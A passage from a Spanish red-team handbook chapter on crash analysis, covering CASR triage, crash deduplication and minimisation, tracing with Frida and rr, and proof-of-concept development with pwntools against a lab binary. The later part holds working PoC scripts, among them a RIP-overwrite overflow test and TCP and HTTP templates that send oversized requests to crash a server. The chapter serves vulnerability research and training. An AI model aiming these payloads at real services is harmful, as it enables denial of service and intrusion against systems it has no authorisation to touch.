# 1. Generar reporte para crash individual (con ASAN)
casr-san -o crash.casrep -- ./vuln_asan 1 "$(python3 -c 'print(\"A\"*100)')"
# 2. Generar reporte sin sanitizers (usa GDB)
casr-gdb -o crash_gdb.casrep -- ./vuln_no_protect 1 "$(python3 -c 'print(\"A\"*100)')"
# 3. Procesar corpus de crashes de fuzzer
mkdir -p casrep_out
for crash in crashes/*; do
name=$(basename "$crash")
casr-san -o "casrep_out/${name}.casrep" -- ./target_asan "$(cat $crash)" 2>/dev/null || true
done
# 4. Clustering de crashes
casr-cluster -c casrep_out/ deduped_out/
# 5. Ver resumen de clusters
for cluster in deduped_out/cl*; do
count=$(ls -1 "$cluster"/*.casrep 2>/dev/null | wc -l)
first=$(ls "$cluster"/*.casrep 2>/dev/null | head -1)
if [ -f "$first" ]; then

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
severity=$(jq -r '.CrashSeverity.Type' "$first")
desc=$(jq -r '.CrashSeverity.ShortDescription' "$first")
echo "$(basename $cluster): $count crashes - $severity - $desc"
fi
done
Estructura de Reporte CASR ﴾.casrep﴿:
{
"CrashSeverity": {
"Type": "EXPLOITABLE",
"ShortDescription": "heap-buffer-overflow(write)",
"Description": "Write to heap buffer out of bounds"
},
"Stacktrace": [
"#0 0x401156 in heap_overflow vulnerable_suite.c:18",
"#1 0x4012b8 in main vulnerable_suite.c:45",
"#2 0x7f... in __libc_start_main"
],
"CrashLine": "vulnerable_suite.c:18",
"ExecutionClass": {
"FaultAddress": "0x602000000050",
"AccessType": "WRITE"
},
"AsanReport": {
"ErrorType": "heap-buffer-overflow",
"AccessSize": 1,
"AccessAddress": "0x602000000050"
}
}
### 5.4.2.
### 4.4.2 Clases de Severidad de CASR
CASR clasifica crashes en 23 clases de severidad:
Clase
Tipo
Descripción
### EXPLOITABLE
SegFaultOnPc
### E
SIGSEGV con PC corrompido
ReturnAv
### E
Violación de acceso en return
BranchAv
### E
Violación de acceso en branch
CallAv
### E
Violación de acceso en call
DestAv
### E
Violación de acceso en escritura
heap‐buffer‐overflow﴾write﴿
### E
ASAN: overflow de heap escritura
stack‐buffer‐overflow﴾write﴿
### E
ASAN: overflow de stack escritura
heap‐use‐after‐free﴾write﴿
### E
ASAN: UAF escritura
### PROBABLY_EXPLOITABLE
SourceAv
### PE
Violación de acceso en lectura
SegFaultOnPcNearNull
### PE
SIGSEGV en PC cerca de NULL

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
Clase
Tipo
Descripción
DestAvNearNull
### PE
Escritura cerca de NULL mapping
heap‐buffer‐overflow﴾read﴿
### PE
ASAN: overflow de heap lectura
heap‐use‐after‐free﴾read﴿
### PE
ASAN: UAF lectura
### NOT_EXPLOITABLE
AbortSignal
### NE
SIGABRT ﴾assertion, abort﴿
SafeFunctionCheck
### NE
Stack protector triggered
double‐free
### NE
ASAN: double free
SourceAvNearNull
### NE
Lectura cerca de NULL
alloc‐dealloc‐mismatch
### NE
malloc/delete mismatch
### 5.4.3.
### 4.4.3 Checklist de Triage Rápido
┌──────────────────────────────────────────────────────────────────────────┐
│
### CHECKLIST DE TRIAGE RÁPIDO
│
├──────────────────────────────────────────────────────────────────────────┤
│
│
### │1. REPRODUCIBILIDAD
│
│
[ ] Crash se reproduce 10/10 veces
│
│
[ ] Crash requiere condiciones específicas (timing, memory layout)
│
│
[ ] Usar rr/TTD si no es determinístico
│
│
│
### │2. TIPO DE CRASH
│
│
[ ] Stack corruption (canary tripped, RIP overwrite)
│
│
[ ] Heap corruption (UAF, double-free, overflow)
│
│
[ ] NULL dereference
│
│
[ ] Integer overflow →memory corruption
│
│
[ ] Format string
│
│
│
### │3. CONTROL DEL ATACANTE
│
│
[ ] ¿Controla RIP/EIP directamente?
│
│
[ ] ¿Controla datos escritos?
│
│
[ ] ¿Controla dirección de escritura?
│
│
[ ] ¿Controla tamaño de operación?
│
│
[ ] ¿Puede obtener info leak primero?
│
│
│
### │4. MITIGACIONES
│
│
[ ] checksec --file target
│
│
[ ] ASLR: ON/OFF (cat /proc/sys/kernel/randomize_va_space)
│
│
### [ ] DEP/NX: ON/OFF
│
│
[ ] Stack Canary: ON/OFF
│
│
### [ ] PIE: ON/OFF
│
│
[ ] RELRO: Full/Partial/No
│

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
│
### [ ] CFI: ON/OFF
│
│
[ ] CET (Intel): ON/OFF
│
│
│
### │5. ALCANZABILIDAD
│
│
[ ] ¿Cómo se alcanza el código vulnerable desde input externo?
│
│
[ ] ¿Requiere autenticación?
│
│
[ ] ¿Es alcanzable remotamente?
│
│
[ ] ¿Qué privilegios se requieren?
│
│
│
└──────────────────────────────────────────────────────────────────────────┘
Verificación de Mitigaciones con checksec:
# Linux con checksec de pwntools
checksec --file ./target
# Salida típica:
#
Arch:
amd64-64-little
#
## RELRO:
Partial RELRO
#
Stack:
No canary found
#
## NX:
NX enabled
#
## PIE:
No PIE (0x400000)
# Windows con winchecksec
winchecksec.exe target.exe
# Verificar CET (Intel Control-flow Enforcement Technology)
readelf -n target | grep -i "IBT\|SHSTK"
# Verificar ARM PAC/BTI
readelf -n target | grep -i "PAC\|BTI"
### 5.4.4.
### 4.4.4 Deduplicación de Crashes
Cuando un fuzzer produce miles de crashes, la deduplicación es esencial para enfocarse en bugs
únicos.
Método 1: Hash de Stack Trace
#!/bin/bash
# dedupe_by_stack.sh - Deduplicación por hash de top 3 frames
CRASHES_DIR="crashes"
DEDUPED_DIR="deduped_stack"
mkdir -p "$DEDUPED_DIR"
declare -A seen_hashes
for crash in "$CRASHES_DIR"/*; do

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
# Ejecutar y capturar backtrace
bt=$(gdb -q -batch \
-ex "run" \
-ex "bt 3" \
--args ./target_asan "$(cat $crash)" 2>&1 | grep -E "^#[0-3]")
# Normalizar (remover direcciones, solo funciones)
normalized=$(echo "$bt" | sed 's/0x[0-9a-f]*//g' | tr -d ' \n')
# Hash
hash=$(echo "$normalized" | md5sum | cut -d' ' -f1)
if [[ -z "${seen_hashes[$hash]}" ]]; then
seen_hashes[$hash]=1
cp "$crash" "$DEDUPED_DIR/"
echo "UNIQUE: $(basename $crash) - $hash"
else
echo "DUPE: $(basename $crash)"
fi
done
echo "Reduced $(ls $CRASHES_DIR | wc -l) crashes to $(ls $DEDUPED_DIR | wc -l) unique"
Método 2: Deduplicación por Cobertura
#!/bin/bash
# dedupe_by_coverage.sh - Usa afl-showmap para deduplicar por cobertura
AFL_PATH="/usr/local/bin"
CRASHES_DIR="crashes"
DEDUPED_DIR="deduped_cov"
mkdir -p "$DEDUPED_DIR"
declare -A seen_coverage
for crash in "$CRASHES_DIR"/*; do
# Generar mapa de cobertura
$AFL_PATH/afl-showmap -q -o /tmp/cov_map -- ./target_afl < "$crash" 2>/dev/null
# Hash del mapa de cobertura
hash=$(md5sum /tmp/cov_map | cut -d' ' -f1)
if [[ -z "${seen_coverage[$hash]}" ]]; then
seen_coverage[$hash]=1
cp "$crash" "$DEDUPED_DIR/"
fi
done
Método 3: CASR Clustering

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
# CASR hace clustering inteligente considerando:
# - Stack trace similarity
# - Crash type
# - Fault address proximity
mkdir -p casrep_all deduped_casr
# Generar reportes para todos los crashes
for crash in crashes/*; do
name=$(basename "$crash")
casr-san -o "casrep_all/${name}.casrep" -- ./vuln_asan < "$crash" 2>/dev/null || true
done
# Clustering
casr-cluster -c casrep_all/ deduped_casr/
# Resultado: Un directorio por cluster (cl1, cl2, cl3, ...)
# Cada cluster representa un bug único probable
### 5.4.5.
### 4.4.5 Detección de Timeouts y Hangs
# Script para detectar y clasificar hangs
#!/bin/bash
# detect_hangs.sh
### TIMEOUT=5
# segundos
for crash in crashes/*; do
start_time=$(date + %s. %N)
timeout $TIMEOUT ./target < "$crash" 2>/dev/null
exit_code=$?
end_time=$(date + %s. %N)
duration=$(echo "$end_time - $start_time" | bc)
if [ $exit_code -eq 124 ]; then
echo "HANG: $(basename $crash) (timeout after ${TIMEOUT}s)"
mv "$crash" hangs/
elif [ $exit_code -ne 0 ]; then
echo "CRASH: $(basename $crash) (exit code $exit_code)"
fi
done
### 5.4.6.
### 4.4.6 Minimización de Crashes
La minimización reduce un crash input a los bytes esenciales, facilitando análisis de causa raíz.

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
AFL‐tmin ﴾para targets con archivo de entrada﴿:
# Uso básico de afl-tmin
afl-tmin -i crash_input -o minimized_crash -- ./target @@
# Con instrumentación ASAN
afl-tmin -i crash_input -o minimized_crash -- ./target_asan @@
# Opciones útiles:
# -t msec
: Timeout por ejecución
# -m megs
: Límite de memoria
# -e
: Edge coverage mode (más preciso)
Minimizador Python ﴾para targets con argumentos CLI﴿:
#!/usr/bin/env python3
# minimize_crash.py - Minimizador por búsqueda binaria
import subprocess
import sys
import os
def crashes_with(data, target, test_case):
"""Ejecuta target y verifica si crashea"""
try:
result = subprocess.run(
[target, test_case, data],
timeout=2,
capture_output=True
)
### # SIGSEGV = -11, SIGABRT = -6
return result.returncode < 0 or result.returncode == 1
except subprocess.TimeoutExpired:
return False
def minimize(data, target, test_case):
"""Minimiza data manteniendo el crash"""
current = data
# Fase 1: Eliminar chunks grandes
chunk_size = len(current) // 2
while chunk_size >= 1:
i = 0
while i < len(current):
candidate = current[:i] + current[i+chunk_size:]
if len(candidate) > 0 and crashes_with(candidate, target, test_case):
current = candidate
print(f"Reduced to {len(current)} bytes (removed chunk at {i})")
else:

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
i += 1
chunk_size //= 2
# Fase 2: Eliminar bytes individuales
i = 0
while i < len(current):
candidate = current[:i] + current[i+1:]
if len(candidate) > 0 and crashes_with(candidate, target, test_case):
current = candidate
print(f"Reduced to {len(current)} bytes")
else:
i += 1
return current
if __name__ == "__main__":
if len(sys.argv) < 4:
print(f"Usage: {sys.argv[0]} <target> <test_case> <initial_payload>")
sys.exit(1)
target = sys.argv[1]
test_case = sys.argv[2]
initial = sys.argv[3]
print(f"Initial size: {len(initial)} bytes")
minimized = minimize(initial, target, test_case)
print(f"\nMinimized size: {len(minimized)} bytes")
print(f"Minimized payload: {repr(minimized)}")
Minimización de Corpus ﴾afl‐cmin﴿:
# Reducir corpus manteniendo cobertura completa
afl-cmin -i corpus_full/ -o corpus_min/ -- ./target @@
# Resultado: corpus_min/ contiene el subset mínimo que mantiene
# la misma cobertura de código que corpus_full/
### 5.5.
### 4.5 Análisis de Alcanzabilidad ﴾Reachability Analysis﴿
El análisis de alcanzabilidad determina cómo un atacante puede llegar al código vulnerable desde
un punto de entrada externo, y qué datos controla en ese camino.
### 5.5.1.
### 4.5.1 DynamoRIO + drcov
DynamoRIO es un framework de instrumentación dinámica binaria. drcov genera cobertura de blo‐
ques básicos.

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
Instalación:
# Descargar release
wget https://github.com/DynamoRIO/dynamorio/releases/download/release_10.0.0/DynamoRIO-Linux-10.0.0.
tar xzf DynamoRIO-Linux-10.0.0.tar.gz
export DYNAMORIO_HOME=$(pwd)/DynamoRIO-Linux-10.0.0
# Agregar al PATH
echo "export PATH=\$PATH:$DYNAMORIO_HOME/bin64" >> ~/.bashrc
source ~/.bashrc
Generación de Cobertura:
cd ~/crash_analysis_lab
# Generar cobertura para crash input
drrun -t drcov -- ./vuln_no_protect 1 "$(python3 -c 'print(\"A\"*100)')"
# Salida: drcov.vuln_no_protect.*.log
# Formato: Lista de bloques básicos ejecutados
# Visualizar en IDA/Ghidra con lighthouse/dragondance
# O analizar con herramientas de texto:
cat drcov.*.log | grep -E "^module|^BB"
### 5.5.2.
### 4.5.2 Intel Processor Trace ﴾PT﴿
Intel PT es una característica de hardware que graba el flujo de control con overhead mínimo ﴾~5 %﴿.
Requisitos:
Procesador Intel con soporte PT ﴾Broadwell+﴿
Kernel Linux con CONFIG_INTEL_BTS=y
Permisos para perf
# Verificar soporte
grep -q pt /proc/cpuinfo && echo "PT supported"
# Capturar trace
perf record -e intel_pt//u ./vuln_no_protect 1 "$(python3 -c 'print(\"A\"*100)')"
# Decodificar trace
perf script --itrace=b > trace.txt
# Analizar con perf-read-vdso o herramientas especializadas
# Intel PT genera traces muy detallados pero requiere procesamiento
### 5.5.3.
### 4.5.3 Frida para Tracing Dinámico
Frida permite instrumentar procesos en tiempo real sin recompilación.

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
Instalación:
pip install frida-tools frida
Script de Tracing de Funciones:
// trace_functions.js - Trazar todas las llamadas a funciones del binario
"use strict";
// Obtener base del módulo principal
const mainModule = Process.enumerateModules()[0];
console.log(`[*] Module: ${mainModule.name} at ${mainModule.base}`);
// Enumerar exports y hookear
mainModule.enumerateExports().forEach(exp => {
if (exp.type === 'function') {
Interceptor.attach(exp.address, {
onEnter: function(args) {
console.log(`[CALL] ${exp.name}`);
},
onLeave: function(retval) {
console.log(`[RET]
${exp.name} = ${retval}`);
}
});
}
});
// Para funciones internas (sin export), usar direcciones
/*
Interceptor.attach(ptr("0x401150"), {
onEnter: function(args) {
console.log(`[*] stack_overflow called with: ${args[0].readCString()}`);
}
});
*/
Script de Tracing de Memoria:
// trace_memory.js - Monitorear accesos a memoria
"use strict";
// Hookear malloc para rastrear allocations
const mallocPtr = Module.findExportByName(null, "malloc");
const freePtr = Module.findExportByName(null, "free");
const allocations = new Map();
Interceptor.attach(mallocPtr, {
onEnter: function(args) {
this.size = args[0].toInt32();

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
},
onLeave: function(retval) {
if (!retval.isNull()) {
allocations.set(retval.toString(), {
size: this.size,
backtrace: Thread.backtrace(this.context, Backtracer.ACCURATE)
.map(DebugSymbol.fromAddress).join('\n')
});
console.log(`[MALLOC] ${retval} (${this.size} bytes)`);
}
}
});
Interceptor.attach(freePtr, {
onEnter: function(args) {
const ptr = args[0].toString();
if (allocations.has(ptr)) {
console.log(`[FREE] ${ptr}`);
allocations.delete(ptr);
}
}
});
Ejecución de Scripts Frida:
# Lanzar proceso con script
frida -f ./vuln_no_protect -l trace_functions.js -- 1 "AAAA"
# Attachar a proceso existente
frida -p $(pidof target) -l trace_memory.js
# Script de análisis completo
frida -f ./vuln_no_protect -l trace_complete.js --no-pause -- 3
### 5.5.4.
### 4.5.4 rr ‐ Record and Replay Debugging
rr graba ejecución para replay determinístico, esencial para bugs no determinísticos.
Instalación:
# Ubuntu/Debian
sudo apt install rr
# Verificar soporte
rr cpufeatures
# Puede requerir deshabilitar address space randomization
echo 1 | sudo tee /proc/sys/kernel/perf_event_paranoid
Workflow de rr:

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
cd ~/crash_analysis_lab
# 1. Grabar ejecución
rr record ./vuln_no_protect 1 "$(python3 -c 'print(\"A\"*100)')"
# 2. Replay (inicia GDB con capacidad de ir hacia atrás)
rr replay
# En GDB:
(rr) continue
# Ejecutar hasta crash
(rr) reverse-continue
# Ir hacia atrás hasta breakpoint previo
(rr) reverse-stepi
# Step back una instrucción
(rr) watch -l *0x7fffffffe000
# Watchpoint
(rr) reverse-continue
# Encontrar quién escribió ahí
(rr) when
# Mostrar posición en el trace
# 3. Buscar el momento exacto de corrupción
(rr) break *0x4011a3
# Break en función vulnerable
(rr) reverse-continue
# Ir al último call de esa función
Comandos Esenciales de rr:
Comando GDB
Propósito
reverse-continue ﴾rc﴿
Continuar hacia atrás
reverse-step ﴾rs﴿
Step hacia atrás
reverse-stepi ﴾rsi﴿
Step instruction hacia atrás
reverse-next ﴾rn﴿
Next hacia atrás
reverse-finish
Ir al caller de función actual
when
Mostrar posición en trace
checkpoint
Guardar posición
restart <n>
Ir a checkpoint
Comparación rr vs TTD:
Aspecto
rr ﴾Linux﴿
TTD ﴾Windows﴿
Plataforma
Linux
Windows
Overhead grabación
~2‐10x
~2‐5x
Tamaño trace
Pequeño
Grande
Integración
### GDB
WinDbg
Multithread
Serializado
Completo
Costo
Gratuito
Incluido con WinDbg
### 5.5.5.
### 4.5.5 Análisis de Taint ﴾Flujo de Datos﴿
El análisis de taint rastrea cómo datos controlados por el atacante fluyen a través del programa.
Conceptos:

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
┌──────────────────────────────────────────────────────────────┐
│
### ANÁLISIS DE TAINT
│
├──────────────────────────────────────────────────────────────┤
│
│
│
FUENTES (Sources):
│
│
• Entrada de red (recv, read socket)
│
│
• Archivos leídos
│
│
• Variables de entorno
│
│
• Argumentos de línea de comandos
│
│
│
│
PROPAGACIÓN (Propagation):
│
│
• Copia directa: y = x
│
│
• Operaciones: z = x + y (z tainted si x o y tainted)
│
│
• Llamadas a funciones
│
│
│
│
SUMIDEROS (Sinks):
│
│
• Índices de array: arr[tainted_index]
│
│
• Punteros dereferenciados: *tainted_ptr
│
│
• Argumentos de funciones peligrosas (memcpy size)
│
│
• Instruction pointer
│
│
│
└──────────────────────────────────────────────────────────────┘
Herramientas de Taint Analysis:
Herramienta
Plataforma
Tipo
Triton
Linux/Windows
Simbólico + Concreto
### DECAF
Linux
QEMU‐based
libdft
Linux ﴾32‐bit﴿
Pin‐based
Taintgrind
Linux
Valgrind extension
### 5.5.6.
### 4.5.6 Plantilla de Reporte de Alcanzabilidad
## REACHABILITY PROOF: [Vulnerability ID]
### ### 1. RESUMEN
- **Bug Type**: [heap-buffer-overflow/UAF/stack-overflow/etc]
- **Reachability**: [Remote/Local/Physical]
- **Authentication Required**: [None/User/Admin]
### ### 2. CAMINO DE EJECUCIÓN
[Entry Point] main﴾﴿￿▼[Parser] parse_request﴾user_input﴿￿▼[Validator] validate_data﴾parsed﴿
// Bypass posible con X ￿▼[Handler] process_data﴾validated﴿￿▼[VULNERABLE] vulnera‐
ble_function﴾controlled_buffer﴿

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
### ### 3. DATOS CONTROLADOS
| Parámetro | Origen | Control |
|-----------|--------|---------|
| buffer | argv[2] | Total |
| size | strlen(argv[2]) | Indirecto |
### ### 4. RESTRICCIONES
- Input debe ser < 1024 bytes
- No puede contener NULL bytes (C string)
- Debe pasar validación de formato
### ### 5. TRIGGER MÍNIMO
```bash
./target 1 "$(python3 -c 'print(\"A\"*100)')"
### 5.5.7.
### 6. COBERTURA DE EJECUCIÓN
Bloques ejecutados hasta crash: [N] Archivos relevantes: [source.c:line]
### 5.5.8.
### 7. MITIGACIONES PRESENTES
□ASLR: Enabled
⊠Stack Canary: Disabled
⊠NX: Enabled
⊠PIE: Disabled
---
## 4.6 Desarrollo de PoC (Proof of Concept)
### 4.6.1 Framework pwntools
pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Python.
**Instalación:**
```bash
pip install pwntools
# Dependencias adicionales útiles
pip install capstone keystone-engine ropper
PoC Básico ‐ Stack Buffer Overflow:
#!/usr/bin/env python3
"""
PoC: Stack Buffer Overflow en vulnerable_suite.c (test case 1)

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
Demuestra control de RIP a offset 72 bytes.
"""
from pwn import *
import os
# Configuración
context.binary = './vuln_no_protect'
context.log_level = 'info'
LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
TARGET = os.path.join(LAB_DIR, "vuln_no_protect")
def test_crash():
"""Verifica que el crash ocurre"""
os.chdir(LAB_DIR)
# Buffer de 64 bytes + 8 bytes RBP = 72 bytes hasta RIP
offset = 72
payload = b"A" * offset + b"BBBBBBBB"
# RIP = 0x4242424242424242
log.info(f"Testing with {len(payload)} byte payload")
log.info(f"Payload: {offset} x 'A' + 'BBBBBBBB'")
p = process([TARGET, "1", payload])
# Esperar crash
p.wait(timeout=5)
if p.returncode == -11:
### # SIGSEGV
log.success(f"Crash confirmed! (SIGSEGV)")
return True
elif p.returncode != 0:
log.success(f"Crash confirmed! (exit code {p.returncode})")
return True
else:
log.failure("No crash detected")
return False
def test_rip_control():
"""Verifica control de RIP usando cyclic pattern"""
os.chdir(LAB_DIR)
# Generar patrón de De Bruijn
pattern = cyclic(200)
log.info(f"Testing RIP control with cyclic pattern ({len(pattern)} bytes)")
p = process([TARGET, "1", pattern])
p.wait(timeout=5)

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
# Para verificar el offset exacto, usar GDB:
# gdb ./vuln_no_protect
# run 1 $(python3 -c "from pwn import *; print(cyclic(200).decode())")
# cyclic -l $rip
# o cyclic -l 0x6161616c
log.info("To find exact offset, run in GDB:")
log.info("
cyclic -l <rip_value>")
log.info(f"Expected offset: 72 bytes")
return True
def test_reliability(attempts=10):
"""Prueba confiabilidad del PoC"""
os.chdir(LAB_DIR)
offset = 72
payload = b"A" * offset + b"BBBBBBBB"
log.info(f"Testing reliability ({attempts} attempts)")
successes = 0
for i in range(attempts):
p = process([TARGET, "1", payload])
p.wait(timeout=5)
if p.returncode == -11:
successes += 1
rate = (successes / attempts) * 100
log.info(f"Crash rate: {successes}/{attempts} ({rate:.1f} %)")
if rate >= 90:
log.success("PoC is reliable!")
elif rate >= 50:
log.warning("PoC is semi-reliable")
else:
log.failure("PoC is unreliable")
return rate
if __name__ == "__main__":
import sys
if len(sys.argv) > 1 and sys.argv[1] == "--test":
test_reliability()
elif len(sys.argv) > 1 and sys.argv[1] == "--offset":
test_rip_control()
else:

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
test_crash()
### 5.5.9.
### 4.6.2 Pipeline Automatizado Crash‐to‐PoC
#!/usr/bin/env python3
"""
crash_to_poc.py - Pipeline automatizado para generar PoCs desde crashes
Uso: python3 crash_to_poc.py <target> <test_case> <crash_payload>
"""
import subprocess
import sys
import os
import re
from pathlib import Path
class CrashToPoC:
def __init__(self, target, test_case, payload):
self.target = target
self.test_case = test_case
self.original_payload = payload
self.minimized_payload = None
self.crash_info = {}
def step1_minimize(self):
"""Minimizar el crash input"""
print("[*] Step 1: Minimizing crash input...")
current = self.original_payload
# Búsqueda binaria para encontrar tamaño mínimo
chunk_size = len(current) // 2
while chunk_size >= 1:
i = 0
while i < len(current):
candidate = current[:i] + current[i+chunk_size:]
if len(candidate) > 0 and self._crashes(candidate):
current = candidate
else:
i += 1
chunk_size //= 2
self.minimized_payload = current
reduction = (1 - len(current)/len(self.original_payload)) * 100
print(f"
Reduced: {len(self.original_payload)} -> {len(current)} bytes ({reduction:.1f} %)
return current
def step2_analyze(self):

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
"""Analizar crash con ASAN"""
print("[*] Step 2: Analyzing crash with ASAN...")
# Ejecutar versión ASAN
asan_target = self.target.replace('vuln_no_protect', 'vuln_asan')
if not os.path.exists(asan_target):
asan_target = self.target + "_asan"
try:
result = subprocess.run(
[asan_target, self.test_case, self.minimized_payload or self.original_payload],
capture_output=True,
text=True,
timeout=5
)
output = result.stderr + result.stdout
# Parsear reporte ASAN
if "heap-buffer-overflow" in output:
self.crash_info['type'] = "heap-buffer-overflow"
elif "stack-buffer-overflow" in output:
self.crash_info['type'] = "stack-buffer-overflow"
elif "heap-use-after-free" in output:
self.crash_info['type'] = "heap-use-after-free"
elif "double-free" in output:
self.crash_info['type'] = "double-free"
else:
self.crash_info['type'] = "unknown"
# Extraer ubicación
match = re.search(r'#0.*in (\w+) (.+:\d+)', output)
if match:
self.crash_info['function'] = match.group(1)
self.crash_info['location'] = match.group(2)
print(f"
Type: {self.crash_info.get('type', 'unknown')}")
print(f"
Function: {self.crash_info.get('function', 'unknown')}")
print(f"
Location: {self.crash_info.get('location', 'unknown')}")
except Exception as e:
print(f"
ASAN analysis failed: {e}")
return self.crash_info
def step3_generate_poc(self):
"""Generar script PoC"""
print("[*] Step 3: Generating PoC script...")

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
payload = self.minimized_payload or self.original_payload
crash_type = self.crash_info.get('type', 'unknown')
poc_template = f'''#!/usr/bin/env python3
"""
PoC: {crash_type}
Target: {self.target}
Test Case: {self.test_case}
Generated by crash_to_poc.py
"""
from pwn import *
import os
TARGET = "{self.target}"
TEST_CASE = "{self.test_case}"
# Minimized crash payload
PAYLOAD = {repr(payload)}
def trigger_crash():
"""Trigger the vulnerability"""
log.info(f"Payload size: {{len(PAYLOAD)}} bytes")
p = process([TARGET, TEST_CASE, PAYLOAD])
p.wait(timeout=5)
if p.returncode < 0:
log.success(f"Crash triggered (signal {{-p.returncode}})")
return True
elif p.returncode != 0:
log.success(f"Crash triggered (exit code {{p.returncode}})")
return True
else:
log.failure("No crash")
return False
def test_reliability(n=10):
"""Test PoC reliability"""
successes = sum(1 for _ in range(n) if trigger_crash())
log.info(f"Reliability: {{successes}}/{{n}} ({{100*successes/n:.1f}} %)")
return successes / n
if __name__ == "__main__":
import sys
if "--test" in sys.argv:
test_reliability()
else:
trigger_crash()

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
'''
poc_path = f"poc_{crash_type.replace('-', '_')}.py"
with open(poc_path, 'w') as f:
f.write(poc_template)
os.chmod(poc_path, 0o755)
print(f"
Generated: {poc_path}")
return poc_path
def step4_test(self):
"""Probar el PoC generado"""
print("[*] Step 4: Testing PoC reliability...")
payload = self.minimized_payload or self.original_payload
successes = 0
attempts = 10
for _ in range(attempts):
if self._crashes(payload):
successes += 1
rate = (successes / attempts) * 100
print(f"
Reliability: {successes}/{attempts} ({rate:.1f} %)")
return rate >= 90
def _crashes(self, payload):
"""Helper: verificar si payload causa crash"""
try:
result = subprocess.run(
[self.target, self.test_case, payload],
capture_output=True,
timeout=2
)
return result.returncode < 0 or result.returncode == 1
except:
return False
def run_pipeline(self):
"""Ejecutar pipeline completo"""
print(f"\n{'='*60}")
print("CRASH-TO-POC PIPELINE")
print(f"{'='*60}")
print(f"Target: {self.target}")
print(f"Test Case: {self.test_case}")
print(f"Original Payload Size: {len(self.original_payload)} bytes")

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
print(f"{'='*60}\n")
self.step1_minimize()
self.step2_analyze()
poc_path = self.step3_generate_poc()
reliable = self.step4_test()
print(f"\n{'='*60}")
print("PIPELINE COMPLETE")
print(f"{'='*60}")
print(f"PoC Script: {poc_path}")
print(f"Reliable: {'Yes' if reliable else 'No'}")
print(f"{'='*60}\n")
return poc_path
if __name__ == "__main__":
if len(sys.argv) < 4:
print(f"Usage: {sys.argv[0]} <target> <test_case> <payload>")
print(f"Example: {sys.argv[0]} ./vuln_no_protect 1 \"{'A'*100}\"")
sys.exit(1)
pipeline = CrashToPoC(sys.argv[1], sys.argv[2], sys.argv[3])
pipeline.run_pipeline()
### 5.5.10.
### 4.6.3 PoC para Servicios de Red
Plantilla Genérica TCP:
#!/usr/bin/env python3
"""
network_poc_template.py - PoC para vulnerabilidad en servicio de red
"""
from pwn import *
import socket
# Configuración del target
### HOST = "127.0.0.1"
### PORT = 8888
### TIMEOUT = 5
context.log_level = 'info'
def send_payload(payload):
"""Envía payload al servidor y retorna respuesta"""
try:
conn = remote(HOST, PORT, timeout=TIMEOUT)
conn.send(payload)

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
response = conn.recvall(timeout=2)
conn.close()
return response
except EOFError:
log.info("Connection closed by server (possible crash)")
return None
except Exception as e:
log.error(f"Connection error: {e}")
return None
def check_server_alive():
"""Verifica si el servidor está respondiendo"""
try:
conn = remote(HOST, PORT, timeout=2)
conn.close()
return True
except:
return False
def trigger_vulnerability():
"""Trigger principal de la vulnerabilidad"""
log.info(f"Target: {HOST}:{PORT}")
# Verificar que servidor está vivo antes
if not check_server_alive():
log.failure("Server not responding")
return False
# Construir payload malicioso
# Ajustar según la vulnerabilidad específica
overflow_size = 256
payload = b"GET /" + b"A" * overflow_size + b" HTTP/1.1\r\n\r\n"
log.info(f"Sending {len(payload)} byte payload")
response = send_payload(payload)
# Verificar crash
if not check_server_alive():
log.success("Server crashed!")
return True
elif response is None:
log.success("Connection dropped (possible crash)")
return True
else:
log.warning("Server still alive")
return False
if __name__ == "__main__":

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
trigger_vulnerability()
PoC HTTP con requests:
#!/usr/bin/env python3
"""
http_poc.py - PoC para vulnerabilidad en servidor HTTP
"""
import requests
import time
TARGET = "http://127.0.0.1:8888"
### TIMEOUT = 5
def check_alive():
"""Verificar si servidor responde"""
try:
requests.get(TARGET, timeout=2)
return True
except:
return False
def trigger_overflow():
"""Enviar request malicioso"""
print(f"[*] Target: {TARGET}")
if not check_alive():
print("[-] Server not responding")
return False
# Path overflow
malicious_path = "/" + "A" * 2000
print(f"[*] Sending overflow ({len(malicious_path)} byte path)")
try:
requests.get(TARGET + malicious_path, timeout=TIMEOUT)
except requests.exceptions.ConnectionError:
print("[+] Connection error (possible crash)")
except requests.exceptions.ReadTimeout:
print("[+] Timeout (possible hang)")
time.sleep(1)
if not check_alive():
print("[+] Server crashed!")
return True
else:
print("[-] Server still alive")

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
return False
if __name__ == "__main__":
trigger_overflow()
### 5.5.11.
### 4.6.4 Análisis de Crashes en Rust y Go
Rust ‐ Análisis de Panics:
# Habilitar backtraces completos
export RUST_BACKTRACE=full
# Ejecutar y capturar panic
./rust_target < crash_input 2>&1 | tee panic.log
# Para bugs de memoria en código unsafe, usar ASAN (nightly)
RUSTFLAGS="-Z sanitizer=address" cargo +nightly build
./target/debug/rust_target < crash_input
